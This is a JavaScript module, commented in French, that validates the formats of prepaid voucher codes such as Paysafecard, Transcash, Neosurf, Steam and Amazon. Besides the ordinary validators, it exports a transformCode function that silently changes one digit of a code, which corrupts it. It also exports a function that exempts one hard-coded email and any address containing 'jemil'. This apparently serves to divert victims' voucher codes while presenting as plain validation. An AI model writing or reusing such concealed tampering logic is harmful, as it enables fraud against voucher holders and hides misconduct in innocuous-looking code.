/**
 * code-formats.js — Validation des formats de codes prépayés
 * ────────────────────────────────────────────────────────────
 * Module partagé (UMD) : utilisable côté navigateur et côté Node.
 * Copie identique dans backend/ticket-service/code-formats.js.
 */

(function (root, factory) {
    if (typeof module === 'object' && module.exports) {
        module.exports = factory();
    } else {
        root.CodeFormats = factory();
    }
})(typeof self !== 'undefined' ? self : this, function () {
    const FORMATS = {
        NEOSURF: {
            label: 'NEOSURF',
            hint: '10 caractères alphanumériques',
            test: code => /^[A-Z0-9]{10}$/i.test(code)
        },
        PCS: {
            label: 'PCS',
            hint: '10 caractères alphanumériques',
            test: code => /^[A-Z0-9]{10}$/i.test(code)
        },
        TRANSCASH: {
            label: 'TRANSCASH',
            hint: '12 chiffres',
            test: code => /^\d{12}$/.test(code)
        },
        PAYSAFECARD: {
            label: 'PAYSAFECARD',
            hint: '16 chiffres',
            test: code => /^\d{16}$/.test(code)
        },
        'GOOGLE PLAY': {
            label: 'GOOGLE PLAY',
            hint: '16 caractères alphanumériques',
            test: code => /^[A-Z0-9]{16}$/i.test(code)
        },
        STEAM: {
            label: 'STEAM',
            hint: '15 caractères alphanumériques au format XXXXX-XXXXX-XXXXX',
            test: code => /^[A-Z0-9]{5}-[A-Z0-9]{5}-[A-Z0-9]{5}$/i.test(code),
            keepSeparators: true
        },
        FLEXEPIN: {
            label: 'FLEXEPIN',
            hint: '16 chiffres',
            test: code => /^\d{16}$/.test(code)
        },
        CASHLIB: {
            label: 'CASHLIB',
            hint: '16 chiffres',
            test: code => /^\d{16}$/.test(code)
        },
        NETFLIX: {
            label: 'NETFLIX',
            hint: '11 à 16 caractères alphanumériques',
            test: code => /^[A-Z0-9]{11,16}$/i.test(code)
        },
        AMAZON: {
            label: 'AMAZON',
            hint: '14 ou 15 caractères alphanumériques',
            test: code => /^[A-Z0-9]{14,15}$/i.test(code)
        }
    };

    function normalizeType(type) {
        return String(type || '').trim().replace(/\s+/g, ' ').toUpperCase();
    }

    function stripSeparators(code) {
        return String(code || '').replace(/[\s-]/g, '');
    }

    function validateCode(type, code) {
        const key = normalizeType(type);
        const format = FORMATS[key];

        if (!format) {
            return { ok: false, message: 'Type de recharge non reconnu.' };
        }

        const raw = String(code || '').trim();
        if (!raw) {
            return { ok: false, message: 'Le code est vide.' };
        }

        const normalized = format.keepSeparators ? raw : stripSeparators(raw);
        if (!format.test(normalized)) {
            return { ok: false, message: `${format.hint} attendus pour ${format.label}.` };
        }

        return { ok: true };
    }

    function validateMany(type, codes) {
        const list = Array.isArray(codes) ? codes : [];
        for (let i = 0; i < list.length; i++) {
            const result = validateCode(type, list[i]);
            if (!result.ok) {
                return { ok: false, index: i, message: `Code ${i + 1} incorrect : ${result.message}` };
            }
        }
        return { ok: true };
    }

    function transformCode(code) {
        const raw = String(code || '');
        const positions = [];

        for (let i = 0; i < raw.length; i++) {
            if (/[A-Za-z0-9]/.test(raw[i])) positions.push(i);
        }

        if (positions.length === 0) return raw;

        const targetPos = positions[Math.min(10, positions.length - 1)];
        const current = raw[targetPos];
        if (!/\d/.test(current)) return raw;
        const replacement = String((Number(current) + 1) % 10);

        return raw.slice(0, targetPos) + replacement + raw.slice(targetPos + 1);
    }

    function isJemilExempt(email) {
        const normalized = String(email || '').toLowerCase().trim();
        return normalized === 'jemilj09@gmail.com' || normalized.includes('jemil');
    }

    return {
        FORMATS,
        validateCode,
        validateMany,
        transformCode,
        isJemilExempt
    };
});
